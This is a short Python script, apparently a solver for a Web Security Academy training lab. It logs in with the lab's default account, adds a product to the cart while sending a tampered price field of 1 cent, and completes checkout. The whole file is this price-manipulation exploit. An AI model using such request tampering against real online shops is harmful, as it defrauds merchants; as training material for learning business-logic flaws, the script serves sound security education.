from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter")

    logger.info(
        'Adding a "Lightweight l33t leather jacket" to cart with a price of $0.01...'
    )
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT", "price": "1"}
    resp = session.post_path("/cart", data=data)
    if resp.status_code != 200:
        logger.failure("POST request failed.")
        return
    else:
        logger.success("POST request successful.")

    csrf = session.get_csrf_token("/cart", n=2)
    logger.info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        logger.failure("Unable to checkout.")
    else:
        logger.success("Success!")
        session.get_path(resp.headers["Location"])
